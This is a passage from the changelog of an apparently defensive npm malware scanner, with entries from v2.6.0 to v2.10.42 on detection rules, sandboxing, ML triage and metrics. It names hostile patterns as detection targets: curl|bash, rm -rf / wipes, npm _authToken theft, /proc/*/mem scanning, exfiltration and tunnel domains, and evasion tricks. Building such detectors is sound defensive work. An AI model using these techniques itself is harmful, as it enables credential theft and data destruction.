  - `checkTrustedDepDiff()` compares dependencies between consecutive versions
  - New dependency < 7 days old on npm: `trusted_new_unknown_dependency` (CRITICAL, TRUSTED-001)
  - New known dependency: `trusted_new_dependency` (HIGH, TRUSTED-002)
  - CRITICAL findings bypass TRUSTED skip, route to full scan + sandbox
  - `trusted_new_unknown_dependency` added to `HIGH_CONFIDENCE_MALICE_TYPES` (19 total)
  - Context: would have detected plain-crypto-js added to axios@1.14.1

### Changed
- Rules: 193 → **200** (195 RULES + 5 PARANOID)
- Tests: 2868 → **3034**, 0 failed, across 65 files

## [2.10.42] - 2026-03-31

### Fixed
- **Non-blocking poll** (critical bug): Poll and processing are now independent
  - Poll runs on `setInterval(60s)`, processing in a continuous loop
  - Before: monitor did not poll while processing a batch (up to 2h of silence)
  - `pollInProgress` guard prevents overlapping polls
  - Queue depth warning at 5000 packages
  - Context: axios/plain-crypto-js attack (2026-03-30) was missed because poll was blocked

## [2.10.41] - 2026-03-31

### Added
- **gVisor sandbox runtime**: `runsc` as production sandbox runtime
  - Malware cannot detect it is running in a container (no `/.dockerenv`, no cgroup leaks)
  - gVisor `--strace` replaces Linux strace (no external tools needed)
  - gVisor `--log-packets` for network traffic monitoring
  - `scripts/install-gvisor.sh` for installation
  - `gvisor-parser.js` for log parsing
  - Gated behind `MUADDIB_SANDBOX_RUNTIME=gvisor`, fallback to standard Docker
- **Honey token DNS encoding detection**: hex/base64/base64url encoded subdomains in DNS queries

## [2.10.40] - 2026-03-31

### Added
- **Sandbox network blacklist**: Domain classification for sandbox network traffic
  - 28 safe domains (npm, GitHub, CDN, AWS, etc.)
  - 24 known exfil domains (OAST, webhook.site, pipedream, etc.)
  - 7 regex patterns for OAST wildcards
  - 6 tunnel domains (ngrok, serveo, etc.)
  - `classifyDomain()`: safe/blacklisted/tunnel/unknown
  - `sandbox_known_exfil_domain`: HC_TYPE CRITICAL (+50 score)
  - `sandbox_network_outlier`: HIGH (+20 score)
  - `MUADDIB_SANDBOX_NETWORK_ALLOWLIST` env var for extension

## [2.10.39] - 2026-03-30

### Fixed
- **publish_burst severity**: Fixed hardcoded HIGH causing 10x score inflation
- **MT-1 score ceiling**: Score capped at 35 for packages without lifecycle scripts, HC types, or compounds

### Added
- **OpenSSF OSV.dev IOC source**: `scrapeOSVLightweightAPI`, `queryOSVBatch` for malicious package feeds
- **OpenSSF benchmark**: `scripts/ossf-benchmark.js`
- **First-publish sandbox priority**: Sandbox even with 0 findings if first-publish + no repo/new maintainer
- **Network-gated tests**: `MUADDIB_TEST_NETWORK=true` for opt-in network tests

### Changed
- LLM Detective disabled (cost 10EUR/day, 0 true positives)
- IOC files removed from git tracking
- COMPACT and BOOTSTRAP-COV tests mocked (no network dependency)

## [2.10.31] - 2026-03-28

### Fixed
- **Bypass fix: Proxy(globalThis) interception** (AST-083): Detect `new Proxy(globalThis/global/window/self, handler)` — tracks proxy-wrapped globals in `globalThisAliases` for downstream detection
- **Bypass fix: Reflect.apply prototype bind** (AST-084): Detect `Reflect.apply(Function.prototype.bind/call/apply, Function, [...])` — extends Reflect.apply to handle MemberExpression targets

### Changed
- Rules: 193 → **195** (190 RULES + 5 PARANOID)
- Tests: 2862 → **2868**, 0 failed
- Documentation: corrected stale metrics in CLAUDE.md, README.md, SECURITY.md, ARCHITECTURE.md

## [2.10.30] - 2026-03-28

### Fixed
- **Post-refactoring audit**: 8 bug fixes (state leak, saveState args, Docker path, interactive menu paths, SARIF version, hooks version)
- Removed orphaned `src/sandbox.js` (663 lines)

### Added
- 37 new monitor wiring integration tests (`tests/integration/monitor-wiring.test.js`)

### Changed
- Tests: 2825 → **2862** across 62 files

## [2.10.29] - 2026-03-28

### Fixed
- 3 temporal analysis bugs (publish, lifecycle, maintainer — missing dailyAlerts argument)

### Added
- Daily report: coverage ratio, J-1 trends, timeout rates, health metrics, ML stats
- Ground truth: 15 new samples (GT-052→066), TPR@20 as headline, divergence warning

## [2.10.28] - 2026-03-28

### Fixed
- **HOTFIX**: monitor `poll()` missing state argument — production crash fix

## [2.10.27] - 2026-03-28

### Fixed
- JSONL silent EACCES error — `fix-permissions.sh` now covers `data/` directory

## [2.10.26] - 2026-03-27

### Added
- **Healthcheck**: Healthchecks.io integration (`src/monitor/healthcheck.js`) — 10min ping, /start on boot, /fail on crash, SSRF protection
- **Backup**: `scripts/backup.sh` — tar.gz, 7-day retention, configurable
- **Deploy**: `scripts/deploy.sh` — git pull, conditional sandbox rebuild, systemd restart
- **Runbook**: `docs/runbook.md` — 6 incident scenarios (VPS down, P1 alert, deploy, backup restore, npm throttle, memory)
- **Deployment guide**: `docs/DEPLOYMENT.md` — initial setup, deploy workflow

## [2.10.25] - 2026-03-27

### Changed
- **Architecture refactoring phase 2**: Split large files into modules
  - `ast-detectors.js` (3797 LOC) → 12 files in `src/scanner/ast-detectors/`
  - `module-graph.js` (2096 LOC) → 9 files in `src/scanner/module-graph/`
  - ScanContext: centralized mutable state with `resetAll()`
  - CLI split: `bin/muaddib.js` (1223→684 LOC) + `src/commands/`
  - 18 shim files for backward compatibility

## [2.10.23] - 2026-03-27

### Added
- **Blue Team v8**: 21 new AST/scoring detections (AST-070→082, SHELL-023, SCORE-001/002, PKG-017)
- Detection: vm, Worker threads, SharedArrayBuffer, dgram, WebSocket C2, process.binding
- Evasion: string mutation, prototype chain, JSON reviver pollution, Module._resolveFilename
- Patterns: steganography, CI fingerprinting, lifecycle phantom scripts, git hooks persistence
- Red team v8 (30 samples) + Holdout v6 (10 samples) datasets
- OOM fix: auto-respawn `--max-old-space-size=8192 --expose-gc`, GC between scans

### Changed
- Rules: 176 → **193** (188 RULES + 5 PARANOID)

## [2.10.22] - 2026-03-27

### Fixed
- **ANSSI v3 audit fixes**: 8 bypasses patched, 5 CRITICAL scoring adjustments
- IOC: LiteLLM compromised versions added
- UX/CLI improvements

## [2.10.21] - 2026-03-27

### Added
- **Centralized HTTP limiter**: 10 max concurrent registry requests via shared semaphore

### Changed
- Tests: 2743 → **2793** (+50) across 57 files
- Rules: **176** (171 RULES + 5 PARANOID)

## [2.10.20] - 2026-03-27

### Fixed
- **OOM fix**: Memory leak prevention in large package scans
- HTTP semaphore deadlock prevention
- Negative cache for failed registry lookups (avoids retry storms)

## [2.10.19] - 2026-03-26

### Fixed
- HTTP response cache for parallel temporal checks
- Registry request deduplication (same package fetched once)
- Parallel temporal check race conditions

## [2.10.18] - 2026-03-26

### Added
- **Scan performance P1-P6**: Worker threads for CPU-bound scanners, dist/ directory exclusion, AST/file content caches

### Changed
- Significant scan speed improvement on large packages

## [2.10.17] - 2026-03-26

### Fixed
- Static scan timeout raised to 45s (was 30s, insufficient for large packages)
- Size cap reduced to 10MB (was 20MB) for faster scans
- Quick scan mode for overflow files beyond cap

## [2.10.16] - 2026-03-25

### Fixed
- Lifecycle T1a refinement: more precise sandbox triage
- TIER1_TYPES LOW severity filter (exclude LOW threats from T1 classification)

## [2.10.15] - 2026-03-25

### Added
- **T1a/T1b sandbox triage**: Split T1 zone into T1a (likely malicious, sandbox) and T1b (likely benign, skip)
- `mlFiltered` counter reset between daily report cycles

## [2.10.14] - 2026-03-25

### Added
- **LiteLLM/TeamPCP IOCs**: Compromised LiteLLM versions and TeamPCP indicators added to builtin YAML
- `.pth` persistence detection (AST-061): Python .pth auto-exec persistence (LiteLLM/Checkmarx pattern)

## [2.10.13] - 2026-03-24

### Fixed
- IOC PRE-ALERT version-aware matching: check specific version before wildcard match

## [2.10.12] - 2026-03-24

### Added
- **TeamPCP/CanisterWorm detection rules**:
  - `systemd_persistence` (AST-059): systemd service creation (CanisterWorm pgmon.service, TeamPCP sysmon.service)
  - `npm_token_steal` (AST-060): npm config get _authToken extraction (CanisterWorm worm propagation)
  - `root_filesystem_wipe` (SHELL-020): rm -rf / detection (CanisterWorm kamikaze.sh)
  - `proc_mem_scan` (SHELL-021): /proc/*/mem scanning (TeamPCP credential stealer)

### Changed
- Rules: 158 → **163** (158 RULES + 5 PARANOID → 163 RULES + 5 PARANOID)

## [2.10.11] - 2026-03-24

### Fixed
- Migrate npm changes stream to `/registry/_changes` endpoint (npm deprecated old stream API)

## [2.10.10] - 2026-03-23

### Fixed
- R2 `isSDKPattern` credential suffix heuristic: reduce false positives on SDK packages sending credentials to their own API
- R4 dataflow MEDIUM cap: prevent env-only dataflow from escalating to HIGH

## [2.10.9] - 2026-03-23

### Fixed
- `suspicious_dataflow` severity graduation: HIGH → MEDIUM for env/telemetry-only sources (reduces FP noise)

## [2.10.8] - 2026-03-23

### Fixed
- ML webhook guard: prevent ML classifier from overriding IOC-confirmed alerts
- Suppress ALL-LOW override: packages with only LOW threats no longer trigger webhook
- Skip dataset tests gracefully when adversarial/holdout samples not present

### Security
- Self-host highlight.js in HTML reports (remove CDN dependency)
- Adversarial samples and bypass docs moved to private repo (gitignored)

## [2.10.7] - 2026-03-22

### Added
- **Sandbox libfaketime**: Time acceleration for Python/bash evasion detection (CanisterWorm time-bomb patterns)

### Security
- Self-host highlight.js, remove external CDN dependency in HTML report

## [2.10.6] - 2026-03-22

### Fixed
- ML1 suppression override: packages with ML1 probability >= 0.90 bypass suppression
- IOC fallback webhook: send alert even when ML classifier would suppress

## [2.10.5] - 2026-03-22

### Added
- **Audit fondamental pipeline** — 6 chantiers de remediation :
  - C1: Relabeling assaini — sandbox clean → "unconfirmed" au lieu de "fp", guard `manualReview` pour label "fp"
  - C2: Webhook triage P1/P2/P3 — `computeAlertPriority()` avec classification visuelle (rouge/orange/jaune)
  - C3: 3 nouveaux compound scoring rules — `lifecycle_dataflow` (COMPOUND-009, HIGH), `lifecycle_dangerous_exec` (COMPOUND-010, CRITICAL), `obfuscated_lifecycle_env` (COMPOUND-011, HIGH)
  - C4: Lifecycle-aware FP reduction guard — restaure MEDIUM quand lifecycle present
  - C5: Score-0 investigation script (`scripts/analyze-score0.js`)
  - C6: LLM triage design document (`docs/LLM-TRIAGE-DESIGN.md`)
- **ML1 XGBoost** trained: P=0.978, R=0.933, F1=0.955 (114 trees, 21 features, threshold 0.500)
- **ML2 Bundler detector** trained: P=0.992, R=1.000, F1=0.996 (98 trees, 30 features, threshold 0.100)
- `scripts/cleanup-fp-labels.js` — one-shot script to convert contaminated "fp" labels to "unconfirmed"
- `sameFileTypes` support in `applyCompoundBoosts()` for mixed package-level/file-level compound types
- Honey environment: canary tokens, Docker camouflage, auto-sandbox (v2.10.3)

### Fixed
- **ML label contamination**: 8176 records automatically labeled "fp" by sandbox (without honey tokens) → converted to "unconfirmed"
- ML test isolation: pre-load models and null stubs for test suites (model-trees.js and model-bundler.js now contain trained data)
- FPR curated: 10.8% → **11.0%** (58/529, +1 from new compound rules)

### Changed
- Tests: 2533 → **2643** (+110) across 56 → **57** test files
- Rules: 158 → **162** (157 RULES + 5 PARANOID, +4 from C3 compounds + C2 triage)
- Compounds: 5 → **8** (6 existing + 3 new lifecycle compounds, minus 1 reclassified)
- Benchmark Datadog v2: **92.8%** @1 (13538/14587), **69.9%** @20 (10202/14587)

## [2.10.1] - 2026-03-21

### Added
- **Security Audit v3 Remediation**: 6 bypasses closed, 5 new detection rules
  - `suspicious_module_sink` (DATAFLOW-002): Third-party module network sinks (ws, mqtt, socket.io-client)
  - `websocket_credential_exfil` (COMPOUND-007): Credential exfiltration via WebSocket/MQTT/Socket.IO
  - `dangerous_constructor` (AST-057): AsyncFunction/GeneratorFunction via prototype chain access
  - `split_entropy_payload` (ENTROPY-005): High-entropy payload split across string concatenation
  - `lifecycle_file_exec` (COMPOUND-008): Lifecycle script references file containing threats
- WebSocket/MQTT/Socket.IO sink detection in dataflow scanner (ws, mqtt, socket.io-client modules)
- Destructuring tracking for `require('module')._load` and `globalThis` eval/Function aliases
- `Object.getPrototypeOf(async function(){}).constructor` detection
- Split high-entropy payload detection (3+ chunks, combined entropy >= 5.5)
- Lifecycle-file-exec compound: cross-references lifecycle script JS file references with scan results

### Fixed
- **B1**: WebSocket/MQTT/Socket.IO sinks were undetected as exfiltration channels
- **B2**: Split high-entropy payloads evaded entropy scanner by fragmenting strings
- **B3**: Destructuring + prototype chain evasion bypassed alias tracking
- **B4**: Count-threshold dilution for `dynamic_require` targeting dangerous modules (now immune)
- **B5**: Percentage guard noise for `env_access` with network sink (now immune)
- **B6**: Lifecycle script referencing files with threats was not correlated

### Changed
- **FP Reduction**: credential_regex_harvest dilution floor removed, framework prototype patterns extended, lifecycle benign commands downgrade
- FPR curated: 13.2% → **10.8%** (70 → 57/529, -2.4pp)
- FPR random: 8.0% → **7.5%** (16 → 15/200, -0.5pp)
- Tests: 2477 → **2533** (+56) across 56 test files
- Rules: 153 → **158** (153 RULES + 5 PARANOID)
- TPR: **93.9%** (unchanged), ADR: **96.3%** (unchanged)

## [2.10.0] - 2026-03-20

### Added
- **ML Classifier Phase 2**: XGBoost-based binary classifier for T1 zone FP reduction
  - `src/ml/classifier.js`: Pure-JS XGBoost tree traversal with 4 guard rails (below T1 → clean, above T1 → bypass, HC threats → bypass, model absent → bypass)
  - `src/ml/model-trees.js`: Null stub (replaced after training)
- 9 new enriched features in feature extractor (62 → 71 features): `package_age_days`, `weekly_downloads`, `version_count`, `author_package_count`, `has_repository`, `readme_size`, `file_count_total`, `has_tests`, `threat_density`
- ML filter integrated in `monitor.js` between T1 classification and sandbox decision
- `ml_clean` label support in `updateScanStats`
- `mlFiltered` counter in daily report embed
- Python training pipeline: `tools/train-classifier.py` (XGBoost + SHAP), `tools/export-model-js.py`
- `evaluateMLClassifier()` in `evaluate.js` for zero-regression validation

### Changed
- npm registry `getPackageMetadata` now returns `readme_size`
- Optimized: single npm registry fetch per suspect package (reused for both ML features and reputation scoring, eliminates duplicate HTTP call)
- Tests: 2435 → **2477** (+42) across 54 → **56** test files
- Rules: **153** (unchanged), Scanners: **14** (unchanged)
- TPR/FPR/ADR: unchanged (no scoring changes)

## [2.9.4] - 2026-03-20

### Fixed
- **Red Team v7 Blue Team**: 3 FP fixes reducing false positive noise from new rules
- 3 quick wins improving detection on edge cases

### Changed
- **Datadog 17K benchmark v2**: Wild TPR **92.5%** (13,486/14,587 in-scope). 3,335 packages skipped (no JS files). compromised_lib 97.8%, malicious_intent 92.1%. 0 errors. Methodology improved: packages with no JS files are now automatically excluded as out-of-scope instead of counted as misses (previously 88.2% raw / ~100% adjusted in v2.3.0).
- ADR: **96.3%** (103/107 available adversarial + holdout)
- FPR: **12.9%** (68/529)
- Tests: **2336** passed, 0 failed, across 50 files

## [2.9.3] - 2026-03-19

### Changed
- Benchmark cleanup and evaluation pipeline maintenance

## [2.9.2] - 2026-03-19

### Added
- **Compound scoring rules**: 4 zero-FP compound rules that detect co-occurring threat types never seen in benign packages
  - `crypto_staged_payload` (COMPOUND-001): staged_binary_payload + crypto_decipher
  - `lifecycle_typosquat` (COMPOUND-002): lifecycle_script + typosquat_detected
  - `lifecycle_inline_exec` (COMPOUND-004): lifecycle_script + node_inline_exec
  - `lifecycle_remote_require` (COMPOUND-005): lifecycle_script + network_require
- `applyCompoundBoosts()` in scoring.js, called after applyFPReductions
- `dangerous_exec` added to DIST_EXEMPT_TYPES (curl|bash in dist/ is always malicious)
- 3 package-level compounds in PACKAGE_LEVEL_TYPES

### Changed
- Rule count: 147 → **152** (147 RULES + 5 PARANOID, includes 4 compound rules)
- Tests: 2300 → **2329**

## [2.9.1] - 2026-03-18

### Added
- **GlassWorm detection** (March 2026 campaign, 433+ packages): Unicode invisible characters + Blockchain C2
- **Unicode invisible detection**: `countInvisibleUnicode()` in obfuscation.js, threshold >=3 chars
  - Zero-width (U+200B/C/D), BOM (U+FEFF pos>0), word joiner (U+2060), Mongolian (U+180E)
  - Variation selectors (U+FE00-FE0F), supplement (U+E0100-E01EF), tag chars (U+E0001-E007F)
- 3 new AST rules: `unicode_variation_decoder` (AST-053), `blockchain_c2_resolution` (AST-054, CRITICAL/HIGH), `blockchain_rpc_endpoint` (AST-055, MEDIUM)
- 1 new OBF rule: `unicode_invisible_injection` (OBF-003, HIGH)
- 6 GlassWorm C2 IPs added to SUSPICIOUS_DOMAINS_HIGH
- IOC: 4 markers, 2 files, 1 hash, 8 compromised packages (builtin.yaml)

### Changed
- Rule count: 143 → **147** (142 RULES + 5 PARANOID)
- Tests: 2266 → **2300**

## [2.9.0] - 2026-03-18

### Added
- **8 new supply-chain detection rules**:
  - `bin_field_hijack` (PKG-013, HIGH): Package bin field hijacking
  - `npm_publish_worm` (AST-051, CRITICAL): Self-propagating npm publish worm
  - `node_modules_write` (AST-048, HIGH): Writing to node_modules
  - `bun_runtime_evasion` (AST-049, HIGH): Bun runtime detection evasion
  - `static_timer_bomb` (AST-050, HIGH): Static timer bomb patterns
  - `ollama_local_llm` (AST-052, MEDIUM): Ollama local LLM abuse
  - `network_require` (PKG-011, CRITICAL): Network require in lifecycle
  - `node_inline_exec` (PKG-012, CRITICAL): Node inline exec in lifecycle
- Additional PKG rules: `git_dependency_rce` (PKG-014), `npmrc_git_override` (PKG-015), `lifecycle_hidden_payload` (PKG-016)
- `detached_credential_exfil` (AST-047, CRITICAL): Detached credential exfiltration

### Changed
- Rule count: 134 → **143** (138 RULES + 5 PARANOID)
- Tests: 2222 → **2266**

## [2.8.8] - 2026-03-17

### Fixed
- Sandbox confirmation bug fix
- DPRK scoring improvements

### Changed
- Tests: 2210 → **2222**

## [2.8.7] - 2026-03-17

### Added
- **ML pipeline Phase 1**: JSONL feature extraction (62 features per package scan)
- Feature categories: AST patterns, entropy, obfuscation, lifecycle, dataflow, package metadata

## [2.8.6] - 2026-03-17

### Changed
- **Test optimization P1-P3**: Test suite execution time reduced from 373s to 134s
- Converted runScan() to runScanDirect() for in-process scanning

## [2.8.5] - 2026-03-16

### Changed
- Daily stats persistence for monitor
- Monitor concurrency increased to x5

## [2.8.3] - 2026-03-16

### Fixed
- Wildcard IOC fix for edge cases
- WASM discrimination improvements
- SDK dataflow false positive fixes

## [2.8.1] - 2026-03-16

### Added
- Parallel scan processing (concurrency=3)

## [2.8.0] - 2026-03-16

### Added
- **npm changes stream**: Real-time npm monitoring via changes stream, replacing RSS polling for faster detection
- Parallel scan processing infrastructure

### Changed
- Monitor architecture: RSS polling → changes stream

## [2.7.10] - 2026-03-15

### Added
- **Confidence-weighted scoring**: Severity weights adjusted by detection confidence
- **Zip bomb protection**: Size checks prevent decompression bombs in package analysis

## [2.7.9] - 2026-03-15

### Fixed
- **IPv6 SSRF fix**: Additional hardening for IPv6 loopback detection in safeDnsResolve
- **Preload hardening**: Sandbox preload robustness improvements

### Added
- FP audit trail for tracking false positive changes across versions

## [2.7.8] - 2026-03-15

### Added
- **Size cap 20MB** (monitor-only): Skip full scan for packages >20MB unpacked. Malware payloads are tiny (<1MB); 20MB provides 20x safety margin. Exceptions: IOC match (always scan), suspicious lifecycle scripts (always scan)
- **MCP server awareness**: Downgrade `mcp_config_injection` from CRITICAL to MEDIUM when `@modelcontextprotocol/sdk` is in package dependencies — legitimate MCP servers write config files
- **Scan history memory** (monitor-only): Cross-session webhook dedup via `scan-memory.json`. Suppresses duplicate webhooks when score within ±15% and no new threat types. 30-day expiry, 50K max entries. IOC match and HC types bypass memory suppression

### Changed
- Test count: 2143 → **2166** (+23) across 49 files
- VS Code extension version: 2.7.7 → **2.7.8**

## [2.7.7] - 2026-03-15

### Added
- **Destination-aware intent**: `isSDKPattern()` with 22 curated SDK env-domain mappings (AWS, Azure, Google, Firebase, Stripe, Twilio, SendGrid, Datadog, Sentry, Slack, GitHub, GitLab, Cloudflare, OpenAI, Anthropic, MongoDB, Auth0, HubSpot, Contentful, Salesforce, Supabase, Mailgun). Heuristic brand-matching fallback for unknown SDKs
- `SUSPICIOUS_DOMAIN_PATTERNS` blocks tunneling services (ngrok, serveo, localtunnel, etc.) and raw IP addresses from SDK exemption
- `extractEnvVarFromMessage()`, `extractBrandFromEnvVar()`, `domainMatchesSuffix()` helpers exported for testing
- **HC bypass severity check**: Monitor validates severity !== LOW before counting HC types

### Fixed
- **Webhook embed fix**: Discord embed formatting correction in monitor

### Changed
- `buildIntentPairs()` now accepts `targetPath` parameter for file reading (SDK pattern detection)
- Test count: 2093 → **2143** (+50) across 49 files

## [2.7.6] - 2026-03-15

### Added
- **High-confidence malice bypass**: 8 threat types (`lifecycle_shell_pipe`, `fetch_decrypt_exec`, `download_exec_binary`, `intent_credential_exfil`, `intent_command_exfil`, `cross_file_dataflow`, `canary_exfiltration`, `sandbox_network_after_sensitive_read`) bypass reputation attenuation — supply-chain compromise of established packages cannot be suppressed
- **Graduated webhook threshold**: `getWebhookThreshold()` returns 35 (very established, factor ≤0.5), 25 (established, factor ≤0.8), 20 (new/unknown) — established packages require higher static score to trigger webhook
- **Aggressive reputation tiers**: `computeReputationFactor()` floor lowered from 0.30 to 0.10. New tiers: 5+ years age (-0.5), 200+ versions (-0.3), 1M+ weekly downloads (-0.4)

### Fixed
- **Double DORMANT log**: `DORMANT SUSPECT` log moved to `trySendWebhook()` (authoritative, uses adjusted score). `resolveTarballAndScan()` now only logs `FALSE POSITIVE` for packages below threshold
- Exported `HIGH_CONFIDENCE_MALICE_TYPES`, `hasHighConfidenceThreat`, `getWebhookThreshold` for testing

### Changed
- VS Code extension version: 2.7.5 → **2.7.6**

## [2.7.5] - 2026-03-14

### Added
- **WASM standalone detection**: New rule `wasm_standalone` (MUADDIB-AST-046, MEDIUM) detects WebAssembly.compile/instantiate without network sinks. Mutually exclusive with `wasm_host_sink` (CRITICAL) — no double-counting
- **Monitor self-exclude**: Monitor skips scanning `muaddib-scanner` itself from the npm RSS feed (prevents self-triggered webhooks)
- **Reputation scoring** (monitor-only): `computeReputationFactor()` adjusts webhook score based on package age, version count, and weekly downloads. Established packages (>2y, >50 versions, >100K downloads) get factor ~0.3, reducing webhook noise. Floor at 0.3 ensures compromised established packages (event-stream, ua-parser-js) still trigger at score >= 30. IOC matches bypass reputation scoring entirely
- **Scope dedup buffer** (monitor-only): Scoped npm packages (`@scope/...`) published within 5 minutes are grouped into a single Discord webhook instead of N individual alerts. Reduces monorepo noise (e.g., `@jdeploy-installer/x` x6 architectures). Each package still scanned individually and persisted in `persistAlert()`

### Changed
- Rule count: 133 → **134** (129 RULES + 5 PARANOID)
- Test count: 2042 → **2093** (+51) across 49 files
- `npm-registry.js`: `getPackageMetadata()` now returns `version_count` field

## [2.6.9] - 2026-03-14

### Fixed
- **SSRF IPv6 bypass**: `safeDnsResolve()` now resolves both IPv4 and IPv6 addresses via `Promise.allSettled` — prevents SSRF via IPv6 loopback (::1) or ULA (fc00::)
- **Monitor scoring weights**: Aligned `computeRiskScore()` in monitor.js with `SEVERITY_WEIGHTS` from scoring.js (HIGH: 15→10, MEDIUM: 5→3)
- **Package.json overrides typo**: Removed `"loadash"` override (lodash is not a dependency)
- **FPR operator consistency**: `evaluateBenign()` now uses `>=` instead of `>` for BENIGN_THRESHOLD (aligned with GT/ADR which use `>=`)

### Added
- 3 new shell evasion rules: `curl_ifs_evasion` (SHELL-016, CRITICAL), `eval_curl_subshell` (SHELL-017, CRITICAL), `sh_c_curl_exec` (SHELL-018, HIGH)
- **CI version validation**: `publish.yml` now validates that git tag matches `package.json` version before npm publish
- **Evaluation smoke tests**: New test file `evaluation-smoke.test.js` verifying threshold consistency, no per-sample overfitting, and monitor/scoring weight alignment
- **Charcode validation**: `extractNumericArgs()` in deobfuscator now validates values are in [0, 0x10FFFF] before `String.fromCharCode()`

### Changed
- **Per-sample thresholds removed**: `ADVERSARIAL_THRESHOLDS`/`HOLDOUT_THRESHOLDS` objects replaced with flat `ADVERSARIAL_SAMPLES`/`HOLDOUT_SAMPLES` arrays — all samples use global `ADR_THRESHOLD=20`
- **Prototype pollution prevention**: `taintedVars`/`moduleVars`/`classDefs`/`funcDefs` in module-graph.js now use `Object.create(null)` instead of `{}`
- VS Code extension version: 2.5.8 → **2.6.9**
- Test count: 2009 → **2042** tests (+33) across 49 files
- Rule count: 130 → **133** (128 RULES + 5 PARANOID)

## [2.6.6] - 2026-03-13

### Fixed
- **PARANOID_RULES lookup**: `getRule()` now resolves paranoid threat types by rule ID (e.g., `MUADDIB-PARANOID-003`), fixing fallback to UNK-001
- **Sandbox delimiter injection**: Changed `indexOf` to `lastIndexOf` for report delimiter parsing — prevents malicious packages from injecting fake report delimiters
- **Module graph timer leak**: `setTimeout` for module graph timeout is now properly cleared via `finally { clearTimeout() }`
- **Broken URL**: Fixed malformed Snyk URL in `dormant_spike` rule references
- **Dead code removal**: Removed unused `SCANNER_TIMEOUT`/`SCAN_TIMEOUT` constants from `src/index.js` and `CROSS_FILE_MULTIPLIER` from `src/intent-graph.js`

### Added
- **Shell shebang detection**: Shell scanner now scans extensionless files with `#!/bin/sh` or `#!/bin/bash` shebang lines
- **GitHub Actions pwn request detection** (GHA-003): Compound detection for `pull_request_target` + `actions/checkout` with PR head ref/sha — CRITICAL
- **GitHub Actions injection patterns**: Added `github.event.pages[].html_url` to attacker-controlled context patterns
- **Preload fs.promises patches**: Sandbox preload now patches `fs.promises.readFile` and `fs.promises.writeFile` for async API interception
- **TPR dual-threshold reporting**: `evaluate` command now reports TPR at both threshold=3 and threshold=20, with IOC-based vs heuristic-only breakdown
- 1 new rule: `workflow_pwn_request` (MUADDIB-GHA-003, CRITICAL, T1195.002)

### Changed
- **Entropy WIN_THRESHOLD**: Aligned windowed analysis threshold from 6.0 to 5.5 (= STRING_ENTROPY_MEDIUM) — closes detection gap around MAX_STRING_LENGTH
- Test count: 1974 → **2009** tests (+35)
- Rule count: 129 → **130** (125 RULES + 5 PARANOID)

## [2.6.5] - 2026-03-13

### Fixed
- **Audit remediation (post-security audit)** — 6 categories of hardening:
  1. **Critical safety**: Removed self-dependency in package.json, recursion depth guard (MAX_TAINT_DEPTH=50) in module-graph.js, redirect limit (MAX_REDIRECTS=5) in download.js, `warnings[]` array in scan results
  2. **Detection bypasses**: `env_access` conditional classification in intent-graph.js (sensitive env vars only), percentage guard count-based fix in scoring.js, array destructuring + object alias taint propagation in dataflow.js
  3. **Evaluation methodology**: Global ADR_THRESHOLD=20 (replaces per-sample thresholds), scoped TPR reporting, stratified FPR by package size, CI smoke tests
  4. **IOC input validation**: Package name + version format validation in scraper.js
  5. **Paranoid mode**: eval/Function/require alias tracking in scanParanoid
  6. **Documentation**: Methodology caveats, honest metrics
- Test count: 1940 → **1974** (+34)
- ADR: uses global threshold=20 (honest measurement)

## [2.6.4] - 2026-03-13

### Fixed
- **Dependency security**: Bump `flatted` to >=3.4.0 (GHSA-25h7-pfq9-p65f, ReDoS/DoS vulnerability)

## [2.6.3] - 2026-03-13

### Fixed
- **IOC pipeline reliability**: 3 fixes in `src/ioc/scraper.js` and `src/ioc/updater.js`:
  - Split DataDog multi-version CSV entries (e.g., `"1.0.0,1.0.1"`) into individual version records instead of treating as single invalid version
  - Extract GHSA advisory versions from `affected[].ranges[].events[].introduced/fixed` instead of relying on missing `versions` field
  - `NEVER_WILDCARD` guard: prevent packages with known versioned entries from being promoted to wildcard (all-versions-malicious) status
- Test count: +183 IOC pipeline tests

## [2.6.2] - 2026-03-13

### Changed
- **FP Reduction P7 — Scoring Downgrades**: 7 heuristic fixes:
  - LOW-severity alert filtering in monitor (noise reduction)
  - Monorepo scope grouping for publish anomaly detection (prevents false bursts on scoped packages)
  - `env_access` count threshold (>10 hits → LOW) — config-heavy packages
  - `suspicious_dataflow` full bypass (removed 80% ratio guard that failed on packages with many flows)
  - `high_entropy_string` count threshold (>5 hits → LOW) — encoding-heavy packages
  - Extended DIST_FILE_RE with `out|output` directories + `env_access` added to DIST_BUNDLER_ARTIFACT_TYPES
  - `credential_regex_harvest` threshold lowered (>2 hits → LOW) — HTTP client libraries
- Test count: 1869 → **1940** (+71 tests)
- FPR: 12.3% → **12.1%** (64/529) — 1 fewer false positive
- ADR denominator corrected: counts only available samples on disk
- ADR: **94.8%** (73/77 available)

### Added
- Documentation restructure (v2.6.2 docs update)

## [2.6.1] - 2026-03-10

### Added
- **Module-Graph Bounded Path**: 5 new cross-file taint propagation patterns in `src/scanner/module-graph.js`:
  - **Bounded path infrastructure**: MAX_GRAPH_NODES=50, MAX_GRAPH_EDGES=200, MAX_FLOWS=20, 5s timeout via Promise.race — prevents DoS on large packages
  - **Imported sink method detection**: `obj.method(taintedArg)` where method internally contains a network sink (via sinkExports annotation)
  - **Class `this.X` instance taint**: `this.reader = new Reader()` in constructors, `this.reader.readAll()` taint resolution in methods
  - **Stream pipeline detection**: `fs.createReadStream` as taint source + `.pipe()` chain following (MAX_PIPE_DEPTH=5) with cross-file module method resolution
  - **EventEmitter cross-module detection**: `.emit('event', taintedData)` matched with `.on('event', handler)` across files, with `this.method()` handler resolution and ObjectExpression property taint
  - **Pipe chain cross-file flows**: `reader.stream().pipe(transform).pipe(sink.createWritable())` detection across imported module instances
- Extended `describeSensitiveCall` with `os.hostname`, `os.userInfo`, `os.networkInterfaces` as fingerprint sources
- `Object.create(null)` for classMethodBodies to prevent prototype collision crashes on benign packages
- Test count: 1905 → **1932** (+27 tests)
- TPR: **93.9%** (46/49) — unchanged
- FPR: **12.3%** (65/529) — zero FP added
- ADR: **97.3%** (73/75) — unchanged, all 5 Group A adversarial samples now score >= 25

## [2.6.0] - 2026-03-09

### Added
- **Intent Graph v2 — Intra-File Coherence Analysis**: `src/intent-graph.js` detects when a single file contains both a high-confidence credential source AND a dangerous sink (eval, exec, network). Intra-file pairing only — cross-file co-occurrence removed (causes FP explosion on SDKs). LOW-severity threats excluded from pairing (respects FP reductions). Cross-file detection delegated to module-graph.js (proven taint paths).
